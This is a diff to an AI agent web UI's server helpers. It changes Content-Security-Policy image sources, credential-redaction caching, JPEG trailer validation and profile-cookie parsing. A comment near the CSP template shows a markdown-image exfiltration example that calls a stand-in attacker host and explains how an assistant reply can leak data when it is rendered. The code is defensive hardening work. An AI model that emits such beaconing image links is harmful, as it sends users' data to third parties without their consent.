@@ -11,7 +11,9 @@ import os
 import re as _re
 import ssl
 import sys
+import threading
 from pathlib import Path
+from types import MappingProxyType
 from api.config import IMAGE_EXTS, MD_EXTS
 
 logger = logging.getLogger(__name__)
@@ -25,6 +27,13 @@ _PUBLIC_MESSAGE_INTERNAL_FIELDS = frozenset({
     "_active_turn_token",
     "_active_turn_user",
     "_fork_child_turn",
+    "_pending_journal_recovery",
+    "_journal_retry_stream_id",
+    "_journal_retry_attempts",
+    "_journal_retry_first_seen_ts",
+    "_journal_retry_kind",
+    "_journal_retry_owner_token",
+    "_journal_retry_process_token",
     "_webui_trusted_agent_input_text",
     "_webui_unmatched_native_image_mirror",
 })
@@ -193,6 +202,13 @@ _CSP_EXTRA_CONNECT_RE = _re.compile(
 _CSP_EXTRA_FRAME_RE = _re.compile(
     r"^https?://(?:\*\.)?[A-Za-z0-9._~-]+(?::(?P<port>\d{1,5}|\*))?$"
 )
+# Validator for an opt-in img-src allowlist entry (HERMES_WEBUI_CSP_IMG_EXTRA).
+# Accepts the same http(s) origin shape as the frame-extra validator, PLUS the
+# bare scheme tokens `https:` and `http:` as an explicit opt-out escape hatch
+# for operators who deliberately want to restore wide remote-image loading.
+_CSP_EXTRA_IMG_RE = _re.compile(
+    r"^(?:https?:|https?://(?:\*\.)?[A-Za-z0-9._~-]+(?::(?:\d{1,5}|\*))?)$"
+)
 _CSP_HEADER_NAME = 'Content-Security-Policy'
 _CSP_SHARED_POLICY_TEMPLATE = (
     "default-src 'self' https://*.cloudflareaccess.com; "
@@ -201,7 +217,7 @@ _CSP_SHARED_POLICY_TEMPLATE = (
     "script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://static.cloudflareinsights.com blob:; "
     "worker-src blob: 'self' https://cdn.jsdelivr.net; "
     "style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://fonts.googleapis.com; "
-    "img-src 'self' data: https: blob:; "
+    "img-src {img_src}; "
     "font-src 'self' data: https://fonts.gstatic.com; "
     "media-src 'self' data: blob:; "
     "connect-src {connect_src}; "
@@ -209,6 +225,16 @@ _CSP_SHARED_POLICY_TEMPLATE = (
     "manifest-src 'self' https://*.cloudflareaccess.com; "
     "base-uri 'self'; form-action 'self'"
 )
+# Base img-src: same-origin files, inline data: URIs (how the renderer embeds
+# generated/pasted images), and blob: — but NOT bare `https:`. A remote
+# `![alt](https://attacker/?data=…)` in an assistant reply renders as a live
+# <img> and the browser beacons to that origin on render with no tool call or
+# approval — the markdown-image exfiltration class (EchoLeak, #7941). The WebUI
+# loads no remote images of its own (CDN assets are scripts/styles, governed by
+# script-src/style-src), so default-deny here only blocks the exfil vector.
+# Operators who need remote images can allowlist specific hosts (or re-add the
+# bare `https:` scheme) via HERMES_WEBUI_CSP_IMG_EXTRA.
+_CSP_IMG_BASE = "'self' data: blob:"
 # Base frame-src: same-origin only by default (so the existing same-origin
 # dashboard/extension iframes keep working). An operator can widen it, opt-in,
 # via HERMES_WEBUI_CSP_FRAME_EXTRA — e.g. to embed a self-hosted dashboard in an
@@ -265,6 +291,48 @@ def _csp_extra_frame_src() -> str:
     return " " + " ".join(sources)
 
 
+def _valid_csp_extra_img_source(source: str) -> bool:
+    # Bare scheme tokens are an explicit opt-out escape hatch (restore wide
+    # remote images). The regex already validates port range via \d{1,5}, but
+    # re-check it here for the origin form to reject e.g. :99999.
+    if source in ("https:", "http:"):
+        return True
+    match = _CSP_EXTRA_IMG_RE.fullmatch(source)
+    if not match:
+        return False
+    # Extract a trailing :port (not the scheme colon) and range-check it.
+    tail = source.rsplit(":", 1)[-1]
+    if tail.isdigit():
+        try:
+            return 1 <= int(tail) <= 65535
+        except ValueError:
+            return False
+    return True
+
+
+def _csp_extra_img_src() -> str:
+    raw = os.getenv("HERMES_WEBUI_CSP_IMG_EXTRA", "").strip()
+    if not raw:
+        return ""
+    sources = raw.split()
+    if not sources or any(not _valid_csp_extra_img_source(src) for src in sources):
+        logger.warning("Ignoring invalid HERMES_WEBUI_CSP_IMG_EXTRA value")
+        return ""
+    return " " + " ".join(sources)
+
+
+def csp_img_extra_sources(extra_img_src: str | None = None) -> list[str]:
+    """Validated HERMES_WEBUI_CSP_IMG_EXTRA entries as a list, for the page config.
+
+    The renderer mirrors this list so a remote image outside the allowlist is
+    shown as an inert click-to-open link rather than a blocked <img>. Pass the
+    value already computed for the response's CSP header so the page and the
+    header always agree; ``None`` reads (and validates) the environment.
+    """
+    value = _csp_extra_img_src() if extra_img_src is None else extra_img_src
+    return value.split()
+
+
 def _csp_connect_src(extra_connect_src: str = "") -> str:
     return f"{_CSP_CONNECT_BASE} https://cdn.jsdelivr.net{extra_connect_src}"
 
@@ -273,26 +341,35 @@ def _csp_frame_src(extra_frame_src: str = "") -> str:
     return f"{_CSP_FRAME_BASE}{extra_frame_src}"
 
 
+def _csp_img_src(extra_img_src: str = "") -> str:
+    return f"{_CSP_IMG_BASE}{extra_img_src}"
+
+
 def _build_csp_enforced_policy(
     extra_connect_src: str | None = None,
     extra_frame_src: str | None = None,
+    extra_img_src: str | None = None,
 ) -> str:
     if extra_connect_src is None:
         extra_connect_src = _csp_extra_connect_src()
     if extra_frame_src is None:
         extra_frame_src = _csp_extra_frame_src()
+    if extra_img_src is None:
+        extra_img_src = _csp_extra_img_src()
     return _CSP_SHARED_POLICY_TEMPLATE.format(
         connect_src=_csp_connect_src(extra_connect_src),
         frame_src=_csp_frame_src(extra_frame_src),
+        img_src=_csp_img_src(extra_img_src),
     )
 
 
 def _build_csp_report_only_policy(
     extra_connect_src: str | None = None,
     extra_frame_src: str | None = None,
+    extra_img_src: str | None = None,
 ) -> str:
     return (
-        _build_csp_enforced_policy(extra_connect_src, extra_frame_src)
+        _build_csp_enforced_policy(extra_connect_src, extra_frame_src, extra_img_src)
         + "; report-uri /api/csp-report; report-to csp-endpoint"
     )
 
@@ -301,12 +378,25 @@ def _security_headers(handler):
     """Add security headers to every response."""
     extra_connect_src = _csp_extra_connect_src()
     extra_frame_src = _csp_extra_frame_src()
+    # A route that already embedded the image allowlist in its body (the app
+    # shell's window.__HERMES_CONFIG__.imgSrcExtra) pre-sets this attribute so
+    # the header and the page agree for this response; otherwise read it here.
+    # Consume it: with keep-alive one handler instance serves several requests,
+    # and a later response on the same connection must read its own value.
+    preset_img_src = getattr(handler, "_csp_extra_img_src_preset", None)
+    if preset_img_src is not None:
+        try:
+            delattr(handler, "_csp_extra_img_src_preset")
+        except AttributeError:
+            pass
+    extra_img_src = preset_img_src if isinstance(preset_img_src, str) else _csp_extra_img_src()
     handler._csp_extra_connect_src = extra_connect_src
     handler._csp_extra_frame_src = extra_frame_src
+    handler._csp_extra_img_src = extra_img_src
     handler.send_header('X-Content-Type-Options', 'nosniff')
     handler.send_header('X-Frame-Options', 'DENY')
     handler.send_header('Referrer-Policy', 'same-origin')
-    handler.send_header(_CSP_HEADER_NAME, _build_csp_enforced_policy(extra_connect_src, extra_frame_src))
+    handler.send_header(_CSP_HEADER_NAME, _build_csp_enforced_policy(extra_connect_src, extra_frame_src, extra_img_src))
     handler.send_header(
         'Permissions-Policy',
         'camera=(), microphone=(self), geolocation=(), clipboard-write=(self)'
@@ -600,9 +690,14 @@ def _json_response_body(payload, *, pretty: bool = True) -> bytes:
     the public helper default stable for existing tests/callers; hot paths can
     opt into compact JSON with ``pretty=False``.
     """
-    if pretty:
-        return _json.dumps(payload, ensure_ascii=False, indent=2).encode('utf-8')
-    return _json.dumps(payload, ensure_ascii=False, separators=(',', ':')).encode('utf-8')
+    formatting = {'indent': 2} if pretty else {'separators': (',', ':')}
+    body = _json.dumps(payload, ensure_ascii=False, **formatting)
+    try:
+        return body.encode('utf-8')
+    except UnicodeEncodeError:
+        # Recovery preserves provider surrogate halves losslessly. Keep the
+        # same payload/format while making its JSON safe for UTF-8 transport.
+        return _json.dumps(payload, ensure_ascii=True, **formatting).encode('utf-8')
 
 
 def j(handler, payload, status: int=200, extra_headers: dict=None, *, pretty: bool = True) -> None:
@@ -658,6 +753,37 @@ MAX_BODY_BYTES = 20 * 1024 * 1024  # 20MB limit for non-upload POST bodies
 
 
 # ── Credential redaction ──────────────────────────────────────────────────────
+
+# hermes-agent's redaction policy is not fixed at import time:
+# ``agent.redact.register_redaction_patterns()`` (reached from plugins through
+# ``PluginContext.register_redaction_patterns``) rebuilds the prefix matcher by
+# REBINDING two module globals that ``redact_sensitive_text`` reads on every
+# call: ``_PREFIX_RE`` (the compiled alternation) and ``_PREFIX_SUBSTRINGS``
+# (its pre-screen). Every registry shape since the registry appeared swaps both
+# (``_rebuild_prefix_matcher``); the registry dict/list itself is never read on
+# the redaction path. Agents that predate the registry never rebind them, and
+# without hermes-agent there is no policy at all. The identities of these two
+# objects are therefore a complete, O(1) fingerprint of the runtime-mutable
+# part of the policy the small-string memo depends on (#8844).
+_REDACTION_POLICY_KEYS = ("_PREFIX_RE", "_PREFIX_SUBSTRINGS")
+_NO_REDACTION_POLICY = MappingProxyType({})
+_REDACTION_POLICY_MISSING = object()  # tells an absent policy name from an empty one (#8847)
+
+
+def _redaction_policy_namespace(redact_sensitive_text, module):
+    """Return the globals ``redact_sensitive_text`` resolves its policy from.
+
+    Prefers the function's own ``__globals__`` (exactly what it reads at call
+    time, even if ``sys.modules`` later points elsewhere), then the module
+    dict. A namespace with neither policy key (old agent, stub, wrapper) maps
+    to an immutable empty mapping: a constant fingerprint, i.e. today's
+    never-invalidated memo.
+    """
+    for ns in (getattr(redact_sensitive_text, "__globals__", None), getattr(module, "__dict__", None)):
+        if isinstance(ns, dict) and any(key in ns for key in _REDACTION_POLICY_KEYS):
+            return ns
+    return _NO_REDACTION_POLICY
+
 
 def _build_redact_fn():
     """Return a redactor backed by hermes-agent plus local fallback patterns."""
@@ -746,6 +872,9 @@ def _build_redact_fn():
     def _restore_code_env_key_literals(original: str, redacted: str) -> str:
         if not isinstance(original, str) or not isinstance(redacted, str):
             return redacted
+        # Both assignment-prefix patterns require '=' in the original text.
+        if "=" not in original:
+            return redacted
         literal_occurrences: dict[tuple[str, int], str] = {}
         original_counts: dict[str, int] = {}
         for match in _ENV_KEY_PREFIX_RE.finditer(original):
@@ -784,7 +913,9 @@ def _build_redact_fn():
         text = _CRED_RE.sub(lambda m: _mask(m.group(1)), text)
         text = _EMBEDDED_AWS_ACCESS_KEY_RE.sub(lambda m: _mask(m.group(0)), text)
         text = _AUTH_HDR_RE.sub(lambda m: m.group(1) + _mask(m.group(2)), text)
-        text = _ENV_RE.sub(_env_replacement, text)
+        # Earlier passes may remove delimiters; test the text actually scanned.
+        if "=" in text:
+            text = _ENV_RE.sub(_env_replacement, text)
         text = _PRIVKEY_RE.sub("[REDACTED PRIVATE KEY]", text)
         return text
 
@@ -792,6 +923,10 @@ def _build_redact_fn():
         from agent.redact import redact_sensitive_text
     except ImportError:
         return _fallback_redact
+
+    _policy_ns = _redaction_policy_namespace(
+        redact_sensitive_text, sys.modules.get("agent.redact")
+    )
 
     def _combined_redact(text: str) -> str:
         if not isinstance(text, str) or not text:
@@ -809,6 +944,7 @@ def _build_redact_fn():
         agent_redacted = _restore_code_env_key_literals(text, agent_redacted)
         return _fallback_redact(agent_redacted)
 
+    _combined_redact._redaction_policy_ns = _policy_ns
     return _combined_redact
 
 
@@ -817,10 +953,13 @@ _redact_fn_uncached = _build_redact_fn()
 # Repeated dashboard polls re-request the same unchanged session payloads, so
 # the combined redactor (~15 regex passes per string) was the dominant CPU cost
 # under concurrent polling — enough to wedge the single-process server behind
-# the GIL and surface as "Mất kết nối" in the browser. The redactor is pure and
-# deterministic (force=True, fixed masking), so identical strings always map to
-# identical output and are safe to memoize without invalidation.
-_redact_fn_lru = functools.lru_cache(maxsize=4096)(_redact_fn_uncached)
+# the GIL and surface as "Mất kết nối" in the browser. For a FIXED agent policy
+# the redactor is pure and deterministic (force=True, fixed masking), so
+# identical strings map to identical output. The policy itself can grow at
+# runtime (see _REDACTION_POLICY_KEYS), so the memo is scoped to the policy
+# fingerprint by ``_redact_fn_cached`` below (#8844).
+_REDACT_CACHE_MAXSIZE = 4096
+_redact_fn_lru = functools.lru_cache(maxsize=_REDACT_CACHE_MAXSIZE)(_redact_fn_uncached)
 
 # Cap per-entry size so a handful of giant tool-output dumps can't evict the
 # thousands of small recurring strings that actually benefit, or balloon RSS.
@@ -843,10 +982,93 @@ _REDACT_CACHE_MAX_TEXT_LEN = 16384
 # be redacted.
 
 
+def _redaction_policy_namespace_of(lru):
+    """Policy namespace of the redactor *lru* memoizes (empty when unknown)."""
+    ns = getattr(getattr(lru, "__wrapped__", None), "_redaction_policy_ns", None)
+    return ns if isinstance(ns, (dict, MappingProxyType)) else _NO_REDACTION_POLICY
+
+
+def _redaction_policy_state_for(lru):
+    """``(lru, policy_ns.get, _PREFIX_RE, _PREFIX_SUBSTRINGS, has_plugin_patterns)`` as seen now.
+
+    The state holds strong references to the fingerprint objects, so their
+    identities cannot be recycled while they are compared with ``is``.
+
+    ``has_plugin_patterns`` (#8847) is recomputed only when the fingerprint
+    moves, so it needs no invalidation of its own. It is read AFTER the
+    fingerprint: every registry shape (a list, later a per-source dict) is
+    mutated before ``_rebuild_prefix_matcher()`` rebinds the fingerprint, so a
+    state holding the new fingerprint has seen the new registry. If the
+    registry name is absent but plugins can still register patterns (the
+    Agent renamed its private registry), WebUI can't tell, so it reports True
+    and fails closed. Without either name (an Agent that predates the
+    registry, or no policy namespace) it reports False: today's prefilter.
+    """
+    get = _redaction_policy_namespace_of(lru).get
+    prefix_re, prefix_substrings = get("_PREFIX_RE"), get("_PREFIX_SUBSTRINGS")
+    registry = get("_PLUGIN_PREFIX_PATTERNS", _REDACTION_POLICY_MISSING)
+    if registry is not _REDACTION_POLICY_MISSING:
+        has_plugin_patterns = bool(registry)
+    else:  # the registry can't be read: fail closed if plugins can register
+        register = get("register_redaction_patterns", _REDACTION_POLICY_MISSING)
+        has_plugin_patterns = register is not _REDACTION_POLICY_MISSING
+    return (lru, get, prefix_re, prefix_substrings, has_plugin_patterns)
+
+
+_redaction_policy_lock = threading.Lock()
+_redaction_policy_state = _redaction_policy_state_for(_redact_fn_lru)
+
+
+def _sync_redaction_policy():
+    """Slow path: the memo or the agent policy changed since the last call.
+
+    A policy change ROTATES to a fresh LRU instead of clearing in place. A
+    request already computing under the old policy then finishes into the
+    retired cache, which nothing consults again, so it cannot repopulate the
+    live memo with a pre-registration result after the switch. A memo rebound
+    by someone else (tests patch ``_redact_fn_lru``, then restore it) is
+    adopted and cleared, since its entries may predate the current policy.
+    """
+    global _redact_fn_lru, _redaction_policy_state
+    with _redaction_policy_lock:
+        lru = _redact_fn_lru
+        state = _redaction_policy_state
+        current = _redaction_policy_state_for(lru)
+        if lru is state[0]:
+            if current[2] is state[2] and current[3] is state[3]:
+                return state  # another thread already synced this policy
+            try:
+                maxsize = lru.cache_info().maxsize
+            except Exception:
+                maxsize = _REDACT_CACHE_MAXSIZE
+            retired = lru
+            lru = functools.lru_cache(maxsize=maxsize)(lru.__wrapped__)
+            current = (lru,) + current[1:]
+            # Publish the new cache before the state that vouches for it.
+            _redact_fn_lru = lru
+            clear = getattr(retired, "cache_clear", None)
+        else:
+            clear = getattr(lru, "cache_clear", None)
+        if callable(clear):
+            clear()
+        _redaction_policy_state = current
+        return current
+
+
+def _current_redaction_policy():
+    """The policy state for the memo and Agent policy in force now (#8844)."""
+    lru = _redact_fn_lru
+    state = _redaction_policy_state
+    policy_get = state[1]
+    if lru is state[0] and policy_get("_PREFIX_RE") is state[2] and policy_get("_PREFIX_SUBSTRINGS") is state[3]:
+        return state
+    return _sync_redaction_policy()
+
+
 def _redact_fn_cached(text):
     if len(text) > _REDACT_CACHE_MAX_TEXT_LEN:
         return _redact_fn_uncached(text)
-    return _redact_fn_lru(text)
+    return _current_redaction_policy()[0](text)
 
 
 _SENSITIVE_CASE_MARKERS = (
@@ -1011,7 +1233,11 @@ def _redact_text(text: str, *, _enabled: bool | None = None) -> str:
         _enabled = bool(load_settings().get("api_redact_enabled", True))
     if not _enabled:
         return text
-    if not _might_contain_sensitive_text(text):
+    # The prefilter knows only WebUI's fixed markers, not the token shapes a
+    # plugin registered with the Agent at runtime. While any exist, every
+    # string goes to the Agent (fail closed, #8847); without them the shortcut
+    # and its cost are unchanged.
+    if not _might_contain_sensitive_text(text) and not _current_redaction_policy()[4]:
         return text
     return _redact_fn_cached(text)
 
@@ -1189,6 +1415,64 @@ def _mpf_image_ranges(data: bytes, base: int) -> list[tuple[int, int]] | None:
     return ranges
 
 
+_SEF_MAX_ENTRIES = 64
+_SEF_BLOCK_NAME = _re.compile(rb"[\x21-\x7e]+")
+
+
+def _is_samsung_sef_trailer(data: bytes) -> bool:
+    """Return whether *data* is exactly one Samsung SEF trailer.
+
+    Samsung cameras append a Samsung Extended Format trailer after the JPEG EOI:
+    data blocks, then an ``SEFH`` directory, then ``<directory length> SEFT``.
+    Each directory entry is ``u16 0, u16 type, u32 offset back from SEFH,
+    u32 size``, and each block starts with ``u16 0, u16 type, u32 name length,
+    name``. Like MPF, the bytes must be fully accounted for: the blocks tile the
+    whole region from EOI up to SEFH with no gaps or overlaps, every header
+    matches its entry, and nothing follows SEFT.
+
+    The tiling is proven from the directory alone before any block is read, so
+    each block byte is looked at most once: overlapping entries that all point
+    at one huge block are rejected without scanning it (projections run this on
+    every GET).
+    """
+    if len(data) < 20 or data[-4:] != b"SEFT":
+        return False
+    dir_len = int.from_bytes(data[-8:-4], "little")
+    dir_pos = len(data) - 8 - dir_len
+    if dir_pos <= 0 or data[dir_pos:dir_pos + 4] != b"SEFH":
+        return False
+    count = int.from_bytes(data[dir_pos + 8:dir_pos + 12], "little")
+    if not 1 <= count <= _SEF_MAX_ENTRIES or dir_len != 12 + 12 * count:
+        return False
+    blocks = []
+    for index in range(count):
+        entry = dir_pos + 12 + 12 * index
+        if data[entry:entry + 2] != b"\0\0":
+            return False
+        offset = int.from_bytes(data[entry + 4:entry + 8], "little")
+        size = int.from_bytes(data[entry + 8:entry + 12], "little")
+        start = dir_pos - offset
+        if offset > dir_pos or size < 8 or start + size > dir_pos:
+            return False
+        blocks.append((start, size, data[entry + 2:entry + 4]))
+    end = 0
+    for start, size, _kind in sorted(blocks):
+        if start != end:
+            return False
+        end = start + size
+    if end != dir_pos:
+        return False
+    for start, size, kind in blocks:
+        if data[start:start + 2] != b"\0\0" or data[start + 2:start + 4] != kind:
+            return False
+        name_len = int.from_bytes(data[start + 4:start + 8], "little")
+        if name_len < 1 or 8 + name_len > size:
+            return False
+        if _SEF_BLOCK_NAME.fullmatch(data, start + 8, start + 8 + name_len) is None:
+            return False
+    return True
+
+
 def _is_complete_jpeg(raw: bytes, *, _allow_mpf: bool = True) -> bool:
     if len(raw) < 4 or raw[:2] != b"\xff\xd8":
         return False
@@ -1210,7 +1494,7 @@ def _is_complete_jpeg(raw: bytes, *, _allow_mpf: bool = True) -> bool:
             if not saw_sof or not saw_scan:
                 return False
             if mpf_ranges is None:
-                return pos == len(raw)
+                return pos == len(raw) or (_allow_mpf and _is_samsung_sef_trailer(raw[pos:]))
             if mpf_ranges[0] != (0, pos):
                 return False
             # No gaps, overlaps, undeclared pictures or post-EOI payloads.
@@ -1220,7 +1504,7 @@ def _is_complete_jpeg(raw: bytes, *, _allow_mpf: bool = True) -> bool:
                 if not _is_complete_jpeg(raw[start:end], _allow_mpf=False):
                     return False
                 pos = end
-            return pos == len(raw)
+            return pos == len(raw) or _is_samsung_sef_trailer(raw[pos:])
         if marker in {0x00, 0x01, 0xD8} or 0xD0 <= marker <= 0xD7:
             return False
         if pos + 2 > len(raw):
@@ -1705,7 +1989,23 @@ def public_session_projection(session_dict: dict) -> dict:
     Callers use this for every response/export/SSE session payload.  It never
     mutates the in-memory session or the caller's dictionary.
     """
-    return redact_session_data(session_dict)
+    result = redact_session_data(session_dict)
+    from api.gateway_chat import gateway_session_chat_read_only_reason
+
+    result.pop("chat_read_only_reason", None)
+    result.pop("chat_read_only_can_connect", None)
+    result.pop("chat_via_gateway_session", None)
+    from api.gateway_sessions import configured, config_for_session, external_session
+    from api.gateway_chat import webui_gateway_chat_enabled
+    config = config_for_session(result) if external_session(result) else None
+    if config is not None and webui_gateway_chat_enabled(config) and configured(result, config):
+        result["chat_via_gateway_session"] = True
+    reason = gateway_session_chat_read_only_reason(result, config_data=config)
+    if reason:
+        result["chat_read_only_reason"] = reason
+        if external_session(result):
+            result["chat_read_only_can_connect"] = True
+    return result
 
 
 def strip_public_internal_fields(value, *, message_records: bool = False):
@@ -1843,18 +2143,12 @@ def get_profile_cookie(handler) -> str | None:
     impersonate another profile. In no-auth deployments, keep the historical
     plain profile-name cookie behavior.
     """
-    cookie_header = handler.headers.get('Cookie', '')
-    if not cookie_header:
-        return None
-    import http.cookies as _hc
-    cookie = _hc.SimpleCookie()
-    try:
-        cookie.load(cookie_header)
-    except _hc.CookieError:
-        return None
-    cookie_name = get_profile_cookie_name()
-    morsel = cookie.get(cookie_name)
-    if not (morsel and morsel.value):
+    # Same tolerant read as the auth cookie: a foreign cookie on a shared host/domain must
+    # not hide this one, or a profile switch silently does not stick (see read_cookie).
+    from api.auth import read_cookie
+
+    raw_val = read_cookie(handler, get_profile_cookie_name())
+    if not raw_val:
         return None
 
     from api.profiles import _PROFILE_ID_RE
@@ -1862,7 +2156,6 @@ def get_profile_cookie(handler) -> str | None:
     def _valid_profile_name(val: str) -> bool:
         return val == 'default' or bool(_PROFILE_ID_RE.fullmatch(val))
 
-    raw_val = morsel.value
     try:
         from api.auth import is_auth_enabled, parse_cookie, verify_profile_cookie_value
         if is_auth_enabled():
